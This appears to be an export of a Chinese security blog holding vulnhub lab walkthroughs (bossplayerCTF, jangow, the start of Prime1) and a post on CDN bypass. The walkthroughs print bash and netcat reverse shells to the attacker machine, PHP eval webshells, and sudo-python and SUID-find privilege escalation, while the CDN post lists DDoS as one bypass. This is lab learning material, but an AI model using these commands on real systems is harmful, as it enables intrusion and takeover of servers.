alt="img"></p><p>这里是有php的RCE的，我们可以把里面的代码删了换成我们自己的。用php执行反弹shell就行，方法很多，可以直接生成一个php反弹shell的代码，也可以直接用php函数调用系统命令</p><p>我这里用php调用系统命令，用bash反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;bash -c &#x27;bash -i&gt;&amp; /dev/tcp/192.168.56.101/6666 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure><p>监听端口——&gt; Submit提交 —-&gt; Run执行</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670223600449-f74c66c7-4500-4e7d-8d41-afd485ee597d.png" alt="img"></p><p>再来看看Kali这边，成功反弹Shell，拿到的是www权限</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670223695641-dcc4f8f9-8127-4198-9c74-16cdefe6cd3d.png" alt="img"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>尝试了内核提权，suid提权都无果</p><p>于是翻起了文件，看看有没有什么敏感文件，备份文件啥的</p><p>我个人很喜欢上传一个一句话木马，然后用蚁剑连上去，直接图形化找文件，不过这里没有权限创建</p><p>最终在<code>/var/www/html/admin</code>下面发现一个隐藏文件<code>.htpasswd</code></p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670225573961-d84bae10-abf6-49f6-9e63-6418c825df93.png" alt="img"></p><h2 id="htpasswd"><a href="#htpasswd" class="headerlink" title=".htpasswd"></a>.htpasswd</h2><p>查看一下，得到一串字符串，感觉是base64（两个等号）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">base64</span>解密</span></span><br><span class="line">MFZG233VOI5FG2DJMVWGIQBRGIZQ====</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">base32</span>解码</span></span><br><span class="line">armour:Shield@123</span><br></pre></td></tr></table></figure><p>为什么后面选择用base32而不是base64？</p><p>凭经验猜，但首先你得了解一下常用的加密、编码方式有哪些特征</p><ul><li>Base16：结尾没有等号，数字要多于字母；</li><li>Base32：字母要多于数字，明文数量超过10个，结尾可能会有很多等号；</li><li>Base58：结尾没有等号，字母要多于数字；</li><li>Base64：一般情况下结尾都会有1个或者2个等号，明文很少的时候可能没有；</li><li>Base85：等号一般出现在字符串中间，含有一些奇怪的字符；</li><li>Base100：密文由 Emoji 表情组成。</li></ul><p>知道了上面这些特征，你就能大概看出最符合的就是base32了</p><h2 id="切换到armour"><a href="#切换到armour" class="headerlink" title="切换到armour"></a>切换到armour</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -u armour</span><br></pre></td></tr></table></figure><p><code>sudo -l</code>查看armour用户有没有可以执行的sudo命令</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670230053105-3c61f64d-657a-4dec-b7da-537ecdcce28a.png" alt="img"></p><p>发现不用密码就可以执行python，这不直接用python提权？</p><h2 id="python提权"><a href="#python提权" class="headerlink" title="python提权"></a>python提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>成功提权，拿到flag</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1670230199937-c86bb35c-36d3-46f8-8345-1e3107f0aba7.png" alt="img" style="zoom:67%;" /><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>拿到IP之后，对端口进行扫描，发现22，80，3306端口</p><p>80的web页面没有进展，转战3306，通过弱口令拿下数据库</p><p>通过mysql操作，修改admin密码（其中主要的是：理清密码的加密方式）</p><p>用修改过的admin账号登录web管理后台，拓展那里可以执行php代码</p><p>写入反弹shell代码，监听，执行，拿到shell</p><p>通过隐藏文件解密<code>.htpasswd</code>，拿到armour用户的账号密码，切换到该用户</p><p>发现该用户可以不使用密码运行python，用python提权成功，拿到flag</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>重温了一波mysql的命令行操作，很多不熟练，还得再练练，毕竟以后实战环境没有图形化的界面给我操控mysql</li><li>CMS往往有类似于“插件”、“扩展”之类的功能，一般支持自定义，可以上传代码片段，容易拿SHELL</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】bossplayerCTF攻略</title>
      <link href="/2022/bossplayer-ctf-walkthrough/"/>
      <url>/2022/bossplayer-ctf-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1、下载虚拟机<br><a href="https://www.vulnhub.com/entry/bossplayersctf-1%2C375/">虚拟机地址</a><br>2、打开虚拟机<br>直接双击ova文件，选择打开方式为VirtualBox即可<br>3、开机，到这个页面就行了<br><img src="/img/image-20221129200026339.png" alt="image-20221129200026339"></p><p>现在可以开始渗透了~</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="靶机IP"><a href="#靶机IP" class="headerlink" title="靶机IP"></a>靶机IP</h2><p>用nmap扫描整个C段，拿到靶机IP（我的网段是192.168.56.x）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span>.<span class="number">56.1</span>/<span class="number">24</span>        </span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200047187.png" alt="image-20221129200047187"><br>扫出三个IP（192.168.56.1是我物理机)<br><strong>Kali：192.168.56.101靶机：192.168.56.102</strong></p><h2 id="访问Web"><a href="#访问Web" class="headerlink" title="访问Web"></a>访问Web</h2><p>靶机开放了80端口，我们访问一下<br><img src="/img/image-20221129200106819.png" alt="image-20221129200106819"><br>就是些靶机作者写的靶机介绍，没啥提示性的信息<br>然后我查看了前端源码，没发现什么。页面上也没有可以点的链接<br>所以接下来尝试目录扫描</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">56.102</span>/</span><br><span class="line"></span><br><span class="line"><span class="literal">----</span> Scanning URL: http://<span class="number">192.168</span>.<span class="number">56.102</span>/ <span class="literal">----</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/index.html (CODE:<span class="number">200</span>|SIZE:<span class="number">575</span>)                                                                                                   </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/robots.txt (CODE:<span class="number">200</span>|SIZE:<span class="number">53</span>)                                                                                                    </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/server<span class="literal">-status</span> (CODE:<span class="number">403</span>|SIZE:<span class="number">302</span>)</span><br></pre></td></tr></table></figure><p>逐一访问上述三个地址</p><ul><li>index.html：就是上面那个刚打开的网页</li><li>robots.txt：出现了下面的文本</li></ul><blockquote><p>super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg&#x3D;&#x3D;</p></blockquote><ul><li>server-status：提示403Forbidden</li></ul><p>所以这一步的关键就在于<code>robots.txt</code>了，接下来我们对拿到的字符进行base64解码（一看第一感觉是base64）</p><blockquote><p>lol try harder bro</p></blockquote><p>被作者嘲笑了。。。<br>找啊找，这靶机作者真的阴啊！在首页源码下面写了一行注释，因为代码只有12行，却把提示信息写到121行，差点就放过去了！拿到一串字符串</p><blockquote><p>WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK</p></blockquote><p>一眼看不知道是啥加密或者编码，我就先试了base64，解出来个这个</p><blockquote><p>ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K</p></blockquote><p>这一看还是编码，而且没有乱码，长度也明显缩短了，所以这很可能是套娃base64，所以接着解密，直到解出来为止</p><blockquote><p>d29ya2luZ2lucHJvZ3Jlc3MucGhwCg&#x3D;&#x3D;</p></blockquote><p>这里以及看出来了，很明显的base64编码特征，再解密：</p><blockquote><p>workinginprogress.php</p></blockquote><p>我们得到了一个php，拼接访问一下</p><h2 id="workinginprogress-php"><a href="#workinginprogress-php" class="headerlink" title="workinginprogress.php"></a>workinginprogress.php</h2><p><img src="/img/image-20221129200131253.png" alt="image-20221129200131253"><br>看这个样子，应该是要Fuzz参数，看他写的Test ping command，感觉可以命令执行，所以写了个命令去Fuzz</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz <span class="literal">-w</span> /usr/share/wfuzz/wordlist/general/common.txt http://<span class="number">192.168</span>.<span class="number">56.102</span>/workinginprogress.php?FUZZ=whoami</span><br></pre></td></tr></table></figure><p>发现<code>cmd</code>这个参数和其他的不一样<br><img src="/img/image-20221129200148707.png" alt="image-20221129200148707"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>浏览器访问一下，有东西，直接RCE（怎么感觉初级基本都这样，直接RCE，这是我打的第二个初级vulnhub靶机，第一个是jangow，那个的RCE比这个还直接）<br><img src="/img/image-20221129200202831.png" alt="image-20221129200202831"><br>我一般喜欢一句话木马和反弹shell双管齐下。一句话木马连上之后，可视化的传文件看文件啥的方便很多，反弹shell到msf，后续使用msf的模块比较方便。<br>这里记录一下路径，方便连webshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>/var/www/html</span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑发现连不上，ls一看，根本就没写进去，尝试新建文件，ls之后发现也没有新建成功，那就只能试试</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali监听4130端口</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">4130</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">workinginprogress.php?cmd=nc <span class="number">192.168</span>.<span class="number">56.101</span> <span class="number">4130</span> <span class="literal">-e</span>/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用交互式命令行</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; uname <span class="literal">-a</span></span><br><span class="line">Linux bossplayers <span class="number">4.19</span>.<span class="number">0</span><span class="literal">-6-amd64</span> <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">&gt; searchsploit debian <span class="number">4.19</span></span><br><span class="line">Exploits: No Results</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>可以看到，内核提权g了</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>之前总结的提权：<a href="https://www.yuque.com/jen413/neiwang/manzoaybnusi9tvo">提权方式</a><br>里面有写到suid提权，这是第一次suid提权实战！<br><strong>① 查找具有suid权限的命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">/usr/lib/eject/dmcrypt<span class="literal">-get-device</span></span><br></pre></td></tr></table></figure><p>② 这里我们选在 find 提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . <span class="literal">-exec</span> /bin/bash <span class="literal">-p</span> \;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200221596.png" alt="image-20221129200221596"><br>可以看到提权成功了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1、切换到root目录下</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、查看目录下文件</span></span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3、查看root.txt</span></span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p>root.txt的内容</p><blockquote><p>Y29uZ3JhdHVsYXRpb25zCg&#x3D;&#x3D;<br>解密之后：congratulations</p></blockquote><p>Done！！！完成啦！</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】jangow1.0.1攻略</title>
      <link href="/2022/jangow-1.0.1-walkthrough/"/>
      <url>/2022/jangow-1.0.1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ul><li><a href="https://www.vulnhub.com/entry/jangow-101,754/">下载靶机</a></li><li>导入虚拟机（<strong>！！！推荐VirtualBox导入</strong>）</li><li>开机</li><li>得到ip</li></ul><h1 id="【issue】开机没有IP"><a href="#【issue】开机没有IP" class="headerlink" title="【issue】开机没有IP"></a>【issue】开机没有IP</h1><p>正常在开机的时候，<code>REDE</code>后面就会有IP，但是我这里没有显示。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>如果你跟我一样，不想下载VirtualBox而使用的是VMWare导入靶机，这里<strong>推荐用VirtualBox</strong>，我下了导入VB，直接解决问题，建议还是下一个哈，Vulnhub里面很多靶机都是ova的，用VB打开会更好。<br>如果你还是不想下，那这里给出我找的教程（比上面复杂，反正我是跟着弄了好一会没成功就放弃了）</p><ul><li><a href="https://www.yuque.com/summerdon/cpubfz/ux121k">Vulnhub靶机检测不到IP-语雀</a></li><li><a href="https://blog.csdn.net/qq_41918771/article/details/103636890">Vulnhub靶机检测不到IP地址_Vicl1fe的博客-CSDN博客</a></li></ul><h1 id="【issue】VM和VB互通问题"><a href="#【issue】VM和VB互通问题" class="headerlink" title="【issue】VM和VB互通问题"></a>【issue】VM和VB互通问题</h1><p>如果你按照上面的解决方案，解决了VMWare导入虚拟机没有IP的问题，那你可以直接忽略这一步，直接开始。<br>此issue针对靶机在VirtualBox，而Kali依旧在VMWare中。这种情况下，由于VM和VB的虚拟网卡不在同一网段，也就是说Kali和靶机之间是不通的。解决方法参考以下博客</p><ul><li><a href="https://blog.csdn.net/qq_43342566/article/details/102679837">如何在vmware上访问virtualbox的虚拟机</a></li></ul><h1 id="拿到IP"><a href="#拿到IP" class="headerlink" title="拿到IP"></a>拿到IP</h1><p>一开机，直接就显示了<br><img src="/img/image-20221129185113854.png" alt="image-20221129185113854"><br>这里我用了两台攻击机：VMWare里面的Kali以及我的本机win10（哪个方便用哪个)</p><ul><li>靶机：192.168.56.118</li><li>Kali：192.168.56.</li><li>win10：192.168.56.1</li></ul><h1 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCTV 192.168.56.118 &gt; jangow.txt</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221129190507571.png" alt="image-20221129190507571"><br>扫出了一个21端口和80端口</p><h1 id="访问Web服务"><a href="#访问Web服务" class="headerlink" title="访问Web服务"></a>访问Web服务</h1><ul><li>用HTTP访问上面扫出的80端口</li></ul><p><img src="/img/image-20221129185311777.png" alt="image-20221129185311777"></p><ul><li>进入<code>site</code></li></ul><p><img src="/img/image-20221129185325813.png" alt="image-20221129185325813"><br>随便看了看网页的功能点</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ul><li>点击<code>Buscar</code>，直接跳出个空白页面，参数也没有</li></ul><p><img src="/img/image-20221129185339955.png" alt="image-20221129185339955"></p><ul><li>输入个<code>whoami</code>，好家伙，直接RCE了</li></ul><p><img src="/img/image-20221129185357889.png" alt="image-20221129185357889"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ul><li>直接写入一句话木马</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;&#x27; &gt;&gt; getshell.php</span><br></pre></td></tr></table></figure><ul><li>用蚁剑连上webshell</li><li>蚁剑打开一个虚拟终端，查看系统版本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><ul><li>searchsploit找提权脚本，上传到靶机</li></ul><p><img src="/img/image-20221129185413327.png" alt="image-20221129185413327"></p><ul><li>编译，给权限，执行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod 777 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p>一顿操作之后，虚拟终端一点反应都没有<br><img src="/img/image-20221129185429675.png" alt="image-20221129185429675"><br>于是上网看看大家的操作<br>用反弹shell，和上面一样的步骤，最后提权成功了<br><img src="/img/image-20221129185446656.png" alt="image-20221129185446656"><br>这可能就是蚁剑那个虚拟终端的问题了，至此，我们已经拿到靶机的root权限了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><p>vulnhub里面的靶机，最后的flag基本在<code>/root</code>目录下，切过去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现一个proof.txt，打开看看</span></span><br><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure><p>ok!成功拿到flag<br><img src="/img/image-20221129185459966.png" alt="image-20221129185459966"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体流程比较简单，80页面直接就给了个RCE真的骚<br>过程中还是遇到不少问题，比如</p><ul><li>反弹shell有很多种方式，到底用哪种？这是我不会的地方</li><li>蚁剑的虚拟终端，执行命令会出莫名其妙的问题</li><li>还有反弹shell那块，其实只有443端口是可以出的，其他的都会失败</li></ul><p>感觉那个443出网端口，可能作者并不想我们来反弹shell？</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN介绍及绕过</title>
      <link href="/2022/cdn-introduction-and-bypass/"/>
      <url>/2022/cdn-introduction-and-bypass/</url>
      
        <content type="html"><![CDATA[<p>CDN的全称Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/1668482100398-78088975-42bd-491a-a5cf-79f6ce107939.png" alt="img"></p><h1 id="如何判断目标存在CDN服务"><a href="#如何判断目标存在CDN服务" class="headerlink" title="如何判断目标存在CDN服务?"></a>如何判断目标存在CDN服务?</h1><p><strong>– 多地ping</strong></p><ul><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li><li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li></ul><p><strong>– 原理</strong></p><p>利用不通地区对网站进行ping，获取网站的IP地址</p><p>如果加了CDN，<strong>不同地区获取到的IP地址不一样</strong>（CDN服务器不是同一台）</p><h1 id="CDN对安全测试有什么影响"><a href="#CDN对安全测试有什么影响" class="headerlink" title="CDN对安全测试有什么影响?"></a>CDN对安全测试有什么影响?</h1><p>CDN会隐藏服务器真实的IP地址，无法对目标网站的操作系统进行渗透</p><p>CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态CDN加速），拥有相同的网站架构，且CDN服务器可与站点服务器进行交互，因此SQL注入，XSS等漏洞的挖掘并不受太大影响。</p><h1 id="常见CDN绕过方法"><a href="#常见CDN绕过方法" class="headerlink" title="常见CDN绕过方法"></a>常见CDN绕过方法</h1><p><strong>1、子域名IP查询</strong></p><p>CDN要钱，为了节约成本，可能流量小的子站没有做CDN</p><p>但是子站可能和主站不在同一个服务器上！查出来的不一定就是主站的IP</p><p><strong>2、邮箱服务查询</strong></p><p>很多公司内部都有邮件服务器，大部分不会做CDN</p><p>他给你发邮件（反向），不会走CDN。根据他发送的邮件，得到他的IP</p><p><strong>3、外地址请求</strong></p><p>有些公司的业务主要在国内，对国内地区做了CDN，但是国外没有，用国外IP去请求，可能会得到真实IP</p><p><strong>4、遗留文件</strong></p><p>泄露了phpinfo.php会导致IP泄露</p><p><strong>5、网络空间搜索引擎</strong></p><p>fofa、shodan、谛听、zoomeye、censys</p><p>搜索特定文件</p><p><strong>6、DNS解析记录</strong></p><p>之前可能未套CDN，看看之前解析到哪个IP，很有可能是真是IP</p><p><strong>7、以量打量</strong></p><p>用DDOS打光网站CDN的流量（很刑!!!），之后就能拿到真是IP</p><h1 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h1><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h1 id="Extend"><a href="#Extend" class="headerlink" title="Extend"></a>Extend</h1><h2 id="CDN和负载均衡"><a href="#CDN和负载均衡" class="headerlink" title="CDN和负载均衡"></a>CDN和负载均衡</h2><p>CDN只缓存静态文件，比如HTML，CSS，图片，JS等等</p><p>负载均衡相当于另一个克隆服务器，费用较高</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】Prime1攻略</title>
      <link href="/2022/prime-1-walkthrough/"/>
      <url>/2022/prime-1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p><a href="https://www.vulnhub.com/entry/prime-1,358/">Prime: 1 ~ VulnHub</a></p><h1 id="找靶机IP"><a href="#找靶机IP" class="headerlink" title="找靶机IP"></a>找靶机IP</h1><h2 id="通过Guest确定IP"><a href="#通过Guest确定IP" class="headerlink" title="通过Guest确定IP"></a>通过Guest确定IP</h2><p>最下面，有个Guest用户可以登录进去</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221105143451128.png" alt="image-20221105143451128"></p><p>右键，Open Terminal打开终端窗口</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103140616028.png" alt="image-20221103140616028"></p><p>直接执行ifconfig，哎~这IP不就拿到了吗？</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103140855419.png" alt="image-20221103140855419"></p><h2 id="通过扫描确定IP"><a href="#通过扫描确定IP" class="headerlink" title="通过扫描确定IP"></a>通过扫描确定IP</h2><blockquote><p>这是在B站听无涯老师的课程看到的方法</p><p>不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维</p></blockquote><p><strong>用Nmap扫描C段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.120.1/24</span><br></pre></td></tr></table></figure><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103141649097.png" alt="image-20221103141649097"></p><p>可以看到，同网段扫到了四个机子，一般*.1*是自己的物理机，太小太大的都不考虑，就剩128和145了，而128是我Kali的IP，所以剩下的145就是靶机的IP了。</p><p>要是觉得上面的方法靠猜测不妥，凭什么要排除太大和太小的IP啊是吧？这里给出另外一种方法。</p><p>刚刚扫一遍，得到4个存活的IP，这时候把靶机给关了，再扫描一遍C段，应该只有三个了，第二次消失的那一个，就是靶机的IP了。</p><p>那找到IP之后，我们要登录这个系统，有什么办法可以找到密码呢？</p><h1 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h1><p>拿到IP之后，可以继续扫描，这个IP开放了哪些端口，都运行着什么服务，也许就能找到突破口呢。</p><p>继续<strong>用Nmap扫全端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.120.145</span><br></pre></td></tr></table></figure><blockquote><p>这里通过-p参数指定全端口，不指定的话，只会扫描常用端口</p></blockquote><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103143407496.png" alt="image-20221103143407496"></p><p>扫到2个端口，22和80，对应的服务，也写出来了</p><blockquote><p>如果扫出来的端口比较陌生，不知道运行着什么服务，可以百度查询</p><p>这里给出一份<a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">常用的端口对应的服务</a></p></blockquote><p>22端口是SSH服务，无非就是用Xshell去连接，没啥突破口。</p><p>80端口开放的是HTTP服务，也就是有Web服务啊！！！那不开整？</p><h1 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h1><p>用浏览器打开上面开放的80端口</p><p><strong>访问网址</strong>：IP:port，我这里就是192.168.120.145:80（其实直接输入ip就可以访问了，应为HTTP协议默认就是80端口）</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103144324733.png" alt="image-20221103144324733"></p><p>嗯？？这什么情况？？WTF？？？就一张图片？？？玩呢？？</p><p>冷静冷静哈！思考下，遇到就一张图片，有什么思路可以进行下去？</p><ul><li>CMS指纹识别</li><li>Ctrl+U查看前端源码</li><li>目录扫描</li></ul><p>思路列出来了，一个个尝试吧</p><p>CMS指纹识别，壮烈牺牲</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103144853909.png" alt="image-20221103144853909"></p><p>emmm源码就。。。算了吧</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20221103145005398.png" 